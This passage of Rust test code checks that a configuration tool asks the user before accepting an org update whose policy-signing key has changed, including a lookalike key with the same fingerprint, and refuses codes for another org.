    async fn an_update_that_brings_a_new_policy_key_asks_first() {
        let dir = tempfile::tempdir().unwrap();
        // Acme is joined with key A: its row, as a join leaves it, with no copy.
        let data = dir.path().join("data");
        std::fs::create_dir_all(&data).unwrap();
        let store = dots_core::store::Store::open(&data.join(dots_core::store::DB_FILE))
            .await
            .unwrap();
        let joined = org_code("acme-eng", "dots", KEY_A);
        let code = dots_core::vault::org::parse_join_code(&joined).unwrap();
        store
            .add_org(&dots_core::vault::org::OrgRow {
                id: code.org_id,
                name: code.name,
                source: code.source,
                policy_key: code.policy_key,
                last_issued_at: None,
                last_fetch_at: None,
                joined_at: "2026-10-22T09:00:00.000Z".into(),
            })
            .await
            .unwrap();
        store.close().await;
        let rt = runtime(&dir).await;
        let token: SourceCreds =
            serde_json::from_value(serde_json::json!({"kind": "token", "token": "hvs.t"})).unwrap();
        let asked = std::cell::RefCell::new(Vec::new());
        let new_key = org_code("acme-eng", "dots", KEY_B);

        // A no fetches and changes nothing.
        let err = update_org_confirmed(
            &rt,
            "acme-eng",
            &new_key,
            Some(token.clone()),
            answering(&asked, false),
        )
        .await
        .unwrap_err();
        assert_eq!(err, CmdError::cancelled("the org was not updated"));
        assert_eq!(
            *asked.borrow(),
            [key_question(
                "Acme Engineering",
                "the policy key changes from 0101010101010101 to 0202020202020202: the key that \
                 signs the org's policy is new, so accept this code only if your admin told you \
                 the key changed"
            )]
        );
        assert!(asked.borrow()[0].starts_with("Acme Engineering: the policy key changes from"));
        let summary = rt.orgs().summary("acme-eng").await.unwrap();
        assert_eq!(summary.key_fingerprint, "0101010101010101");

        // A yes goes on to the Update, which fetches with the new settings (and fails here).
        let err = update_org_confirmed(
            &rt,
            "acme-eng",
            &new_key,
            Some(token.clone()),
            answering(&asked, true),
        )
        .await
        .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Internal);
        assert!(
            err.message.starts_with("could not update Acme Engineering"),
            "{err:?}"
        );
        assert_eq!(asked.borrow().len(), 2);

        // The same key asks nothing; a code for another org is the core's refusal, unasked.
        let same_key = org_code("acme-eng", "dots2", KEY_A);
        let err = update_org_confirmed(
            &rt,
            "acme-eng",
            &same_key,
            Some(token.clone()),
            answering(&asked, false),
        )
        .await
        .unwrap_err();
        assert!(err.message.starts_with("could not update"), "{err:?}");
        let other = org_code("beta", "dots", KEY_B);
        let err = update_org_confirmed(
            &rt,
            "acme-eng",
            &other,
            Some(token),
            answering(&asked, true),
        )
        .await
        .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Invalid);
        assert_eq!(asked.borrow().len(), 2);
        rt.shutdown();
    }

    /// A key made with the id of `KEY_A` but other bytes after it: the same fingerprint, not the
    /// same key.
    const KEY_A_LOOKALIKE: &str = "RWQBAQEBAQEBASIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIi";

    #[tokio::test]
    async fn a_key_with_the_same_id_is_still_a_new_key_and_asks() {
        let dir = tempfile::tempdir().unwrap();
        let data = dir.path().join("data");
        std::fs::create_dir_all(&data).unwrap();
        let store = dots_core::store::Store::open(&data.join(dots_core::store::DB_FILE))
            .await
            .unwrap();
        let code =
            dots_core::vault::org::parse_join_code(&org_code("acme-eng", "dots", KEY_A)).unwrap();
        store
            .add_org(&dots_core::vault::org::OrgRow {
                id: code.org_id,
                name: code.name,
                source: code.source,
                policy_key: code.policy_key,
                last_issued_at: None,
                last_fetch_at: None,
                joined_at: "2026-10-22T09:00:00.000Z".into(),
            })
            .await
            .unwrap();
        store.close().await;
        let rt = runtime(&dir).await;
        let lookalike = org_code("acme-eng", "dots", KEY_A_LOOKALIKE);
        let preview = rt.preview_org(&lookalike).unwrap();
        assert_eq!(preview.key_fingerprint, "0101010101010101");
        assert!(preview.key_changed);
        let asked = std::cell::RefCell::new(Vec::new());
        let err = update_org_confirmed(&rt, "acme-eng", &lookalike, None, answering(&asked, false))
            .await
            .unwrap_err();
        assert_eq!(err, CmdError::cancelled("the org was not updated"));
        assert_eq!(asked.borrow().len(), 1);
        assert!(asked.borrow()[0].starts_with("Acme Engineering: the policy key changes"));
        let policy_key = rt.orgs().summary("acme-eng").await.unwrap().key_fingerprint;
        assert_eq!(policy_key, "0101010101010101");
        rt.shutdown();
    }
}
